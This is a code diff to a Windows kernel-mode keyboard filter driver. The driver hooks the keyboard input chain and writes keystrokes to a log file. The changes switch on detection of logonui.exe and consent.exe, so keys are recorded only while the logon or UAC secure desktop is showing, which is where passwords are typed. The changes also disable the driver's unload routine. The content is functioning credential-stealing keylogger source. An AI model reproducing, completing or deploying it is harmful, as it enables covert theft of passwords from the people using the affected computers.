@@ -5,7 +5,7 @@
 
 #ifdef ALLOC_PRAGMA
 #pragma alloc_text (INIT, DriverEntry)
-#pragma alloc_text (INIT, DriverUnload)
+// #pragma alloc_text (INIT, DriverUnload)
 #pragma alloc_text (PAGE, RMACKL_EvtDeviceAdd)
 #pragma alloc_text (PAGE, RMACKL_EvtIoInternalDeviceControl)
 #endif
@@ -34,7 +34,7 @@ bool processStatus[] = { FALSE, FALSE };
 // Whether user is on the secure desktop
 bool secureScreen = FALSE;
 
-CHAR* outputBuffer = (char[500]){ 0 };
+// CHAR* outputBuffer = (char[500]){ 0 };
 bool isFileReady = FALSE;
 
 char* keytable[SZ_KEYTABLE] = {
@@ -254,7 +254,7 @@ NTSTATUS InitKeyboardDataArray() {
 	status = WdfSpinLockCreate(&spinLockAttributes, &keyboardDataArray.spinLock);
 
 	if (!NT_SUCCESS(status)) {
-		DebugPrint(("Error (WdfSpinLockCreate): %x\n", status));
+		DebugPrint(("Error (WdfSpinLockCreate): 0x%x\n", status));
 		return status;
 	}
 
@@ -333,7 +333,7 @@ NTSTATUS OpenLogFile() {
 		&ioStatusBlock,
 		NULL,
 		FILE_ATTRIBUTE_NORMAL,
-		FILE_SHARE_WRITE,
+		FILE_SHARE_VALID_FLAGS,
 		FILE_OPEN_IF,
 		FILE_RANDOM_ACCESS,
 		NULL,
@@ -344,7 +344,6 @@ NTSTATUS OpenLogFile() {
 	}
 
 	isFileReady = TRUE;
-
 	return status;
 }
 
@@ -355,50 +354,50 @@ NTSTATUS OpenLogFile() {
  @return Scancode as string
 */
 CHAR* ScanCodeToCharP(char* dest, USHORT i) {
-	sprintf(dest, "%x", i);
+	sprintf(dest, "0x%x", i);
 	return dest;
 }
-#define ITOA(n) ScanCodeToCharP((char [41]) { 0 }, (n) )
+#define ITOA(n) ScanCodeToCharP((char [100]) { 0 }, (n) )
 
 /**
  Write outputBuffer to log file
  */
-NTSTATUS WriteDebugToLogFile() {
-	if (!isFileReady) {
-		return STATUS_FILE_NOT_AVAILABLE;
-	}
-	NTSTATUS status;
-	IO_STATUS_BLOCK		ioStatusBlock;
-	LARGE_INTEGER		ByteOffset;
+ //NTSTATUS WriteDebugToLogFile() {
+ //	if (!isFileReady) {
+ //		return STATUS_SUCCESS;
+ //	}
+ //	NTSTATUS status;
+ //	IO_STATUS_BLOCK		ioStatusBlock;
+ //	LARGE_INTEGER		ByteOffset;
+ //
+ //	ByteOffset.HighPart = -1;
+ //	ByteOffset.LowPart = FILE_WRITE_TO_END_OF_FILE;
+ //
+ //	// Write debug to the log file
+ //	status = ZwWriteFile(
+ //		fileHandle,
+ //		NULL,
+ //		NULL,
+ //		NULL,
+ //		&ioStatusBlock,
+ //		outputBuffer,
+ //		strlen(outputBuffer),
+ //		&ByteOffset,
+ //		NULL);
+ //
+ //	if (!NT_SUCCESS(status)) {
+ //		DebugPrint(("Error (WriteDebugToLogFile): 0x%x\n", status));
+ //	}
+ //
+ //	return status;
+ //}
 
-	ByteOffset.HighPart = -1;
-	ByteOffset.LowPart = FILE_WRITE_TO_END_OF_FILE;
-
-	// Write debug to the log file
-	status = ZwWriteFile(
-		fileHandle,
-		NULL,
-		NULL,
-		NULL,
-		&ioStatusBlock,
-		outputBuffer,
-		strlen(outputBuffer),
-		&ByteOffset,
-		NULL);
-
-	if (!NT_SUCCESS(status)) {
-		DebugPrint(("Error (WriteDebugToLogFile): 0x%x\n", status));
-	}
-
-	return status;
-}
-
-/**
- Write keyboard buffer to log file
- @param n: Number of records to write
- @param buffer: keyboard data buffer
- @return Status of the operation
- */
+ /**
+  Write keyboard buffer to log file
+  @param n: Number of records to write
+  @param buffer: keyboard data buffer
+  @return Status of the operation
+  */
 NTSTATUS WriteToLogFile(DWORD n, PKEYBOARD_INPUT_DATA buffer) {
 	if (!secureScreen) return STATUS_SUCCESS;
 
@@ -414,7 +413,6 @@ NTSTATUS WriteToLogFile(DWORD n, PKEYBOARD_INPUT_DATA buffer) {
 	for (i = 0; i < n; i++) {
 		scancode = buffer[i].MakeCode;
 		flags = buffer[i].Flags;
-#pragma warning(disable:6385)
 		CHAR* key = keytable[scancode];
 		char* scancodeHex = (char[4]){ 0 };
 		sprintf(scancodeHex, "%#04x", scancode);
@@ -478,7 +476,6 @@ NTSTATUS WriteToLogFile(DWORD n, PKEYBOARD_INPUT_DATA buffer) {
 		NULL,
 		&ioStatusBlock,
 		writeBuffer,
-#pragma warning(disable:4267)
 		strlen(writeBuffer),
 		&ByteOffset,
 		NULL);
@@ -513,7 +510,7 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING Registry
 	);
 
 	// Specify driver's Unload function.
-	config.EvtDriverUnload = DriverUnload;
+	// config.EvtDriverUnload = DriverUnload;
 
 	// Create a framework driver object.
 	status = WdfDriverCreate(
@@ -543,23 +540,35 @@ VOID ProcessCallback(IN HANDLE hParentId, IN HANDLE hProcessId, IN BOOLEAN bCrea
 	CHAR* processName = (char[500]){ 0 };
 	CHAR* processBaseName;
 
-	PsLookupProcessByProcessId(hProcessId, &process);
-	SeLocateProcessImageName(process, &processPath);
+	NTSTATUS status = PsLookupProcessByProcessId(hProcessId, &process);
+	if (!NT_SUCCESS(status)) {
+		DebugPrint(("Unable to lookup process"));
+		/*sprintf(outputBuffer, "Unable to lookup process");
+		WriteDebugToLogFile();*/
+		return;
+	}
+	status = SeLocateProcessImageName(process, &processPath);
+	if (!NT_SUCCESS(status)) {
+		DebugPrint(("Unable to locate process executable"));
+		/*sprintf(outputBuffer, "Unable to locate process executable");
+		WriteDebugToLogFile();*/
+		return;
+	}
 
 	DebugPrint(("%s: %wZ\n", bCreate ? "Created   " : "Terminated", processPath));
-	sprintf(outputBuffer, "%s: %wZ\n", bCreate ? "Created   " : "Terminated", processPath);
-	WriteDebugToLogFile();
-
-	/*sprintf(processName, "%wZ", processPath);
-	DebugPrint(("Process Name: %s\n", processName));*/
-
-	/*processBaseName = strrchr(processName, '\\');
-
-	DebugPrint(("%s: %s\n", bCreate ? "Created   " : "Terminated", processBaseName));
-	sprintf(outputBuffer, "%s: %s\n", bCreate ? "Created   " : "Terminated", processBaseName);
+	/*sprintf(outputBuffer, "%s: %wZ\n", bCreate ? "Created   " : "Terminated", processPath);
 	WriteDebugToLogFile();*/
 
-	/*if (strcmp(strlwr(processBaseName), "\logonui.exe") == 0) {
+	sprintf(processName, "%wZ", processPath);
+	// DebugPrint(("Process Name: %s\n", processName));
+
+	processBaseName = strrchr(processName, '\\');
+
+	//DebugPrint(("%s: %s\n", bCreate ? "Created   " : "Terminated", processBaseName));
+	//sprintf(outputBuffer, "%s: %s\n", bCreate ? "Created   " : "Terminated", processBaseName);
+	//WriteDebugToLogFile();
+
+	if (strcmp(strlwr(processBaseName), "\\logonui.exe") == 0) {
 		if (bCreate) {
 			processStatus[0] = TRUE;
 		}
@@ -567,25 +576,25 @@ VOID ProcessCallback(IN HANDLE hParentId, IN HANDLE hProcessId, IN BOOLEAN bCrea
 			processStatus[0] = FALSE;
 		}
 	}
-	else if (strcmp(strlwr(processBaseName), "\consent.exe") == 0) {
+	else if (strcmp(strlwr(processBaseName), "\\consent.exe") == 0) {
 		if (bCreate) {
 			processStatus[1] = TRUE;
 		}
 		else {
 			processStatus[1] = FALSE;
 		}
-	}*/
+	}
 
-	/*if (processStatus[0] || processStatus[1]) {
+	if (processStatus[0] || processStatus[1]) {
 		secureScreen = TRUE;
-		sprintf(outputBuffer, "[Secure Screen START]\n");
-		WriteDebugToLogFile();
+		//sprintf(outputBuffer, "[Secure Screen START]\n");
+		//WriteDebugToLogFile();
 	}
 	else {
 		secureScreen = FALSE;
-		sprintf(outputBuffer, "[Secure Screen STOP]\n");
-		WriteDebugToLogFile();
-	}*/
+		//sprintf(outputBuffer, "[Secure Screen STOP]\n");
+		//WriteDebugToLogFile();
+	}
 }
 
 /**
@@ -662,10 +671,10 @@ NTSTATUS RMACKL_EvtDeviceAdd(IN WDFDRIVER Driver, IN PWDFDEVICE_INIT DeviceInit)
 	InitKeyboardDataArray();
 	OpenLogFile();
 	NTSTATUS result = PsSetCreateProcessNotifyRoutine(ProcessCallback, FALSE);
-	if (result != STATUS_SUCCESS) {
+	if (!NT_SUCCESS(result)) {
 		DebugPrint(("Error (PsSetCreateProcessNotifyRoutine): 0x%x\n", result));
-		sprintf(outputBuffer, "Error (PsSetCreateProcessNotifyRoutine): 0x%x\n", result);
-		WriteDebugToLogFile();
+		//sprintf(outputBuffer, "Error (PsSetCreateProcessNotifyRoutine): 0x%x\n", result);
+		//WriteDebugToLogFile();
 	}
 
 	// Set total written records to 0
@@ -717,7 +726,7 @@ VOID RMACKL_EvtIoInternalDeviceControl(IN WDFQUEUE Queue, IN WDFREQUEST Request,
 			&connectData,
 			&length);
 		if (!NT_SUCCESS(status)) {
-			DebugPrint(("Error (WdfRequestRetrieveInputBuffer): %x\n", status));
+			DebugPrint(("Error (WdfRequestRetrieveInputBuffer): 0x%x\n", status));
 			break;
 		}
 
@@ -728,7 +737,7 @@ VOID RMACKL_EvtIoInternalDeviceControl(IN WDFQUEUE Queue, IN WDFREQUEST Request,
 		// Hook into the report chain
 		// Everytime a keyboard packet is reported to the system, RMACKL_ServiceCallback will be called
 		connectData->ClassDeviceObject = WdfDeviceWdmGetDeviceObject(hDevice);
-        connectData->ClassService = RMACKL_ServiceCallback;
+		connectData->ClassService = RMACKL_ServiceCallback;
 		break;
 
 		// Disconnect a keyboard class device driver from the port driver.
@@ -906,8 +915,8 @@ VOID RMACKLQueueWorkItem(WDFWORKITEM workItem) {
  * Driver unload routine.
  * @param Driver: The WDF Driver.
  **/
-void DriverUnload(IN WDFDRIVER Driver) {
-	UNREFERENCED_PARAMETER(Driver);
-	PsSetCreateProcessNotifyRoutine(ProcessCallback, TRUE);
-	ZwClose(fileHandle);
-}
+ //void DriverUnload(IN WDFDRIVER Driver) {
+ //	UNREFERENCED_PARAMETER(Driver);
+ //	PsSetCreateProcessNotifyRoutine(ProcessCallback, TRUE);
+ //	ZwClose(fileHandle);
+ //}
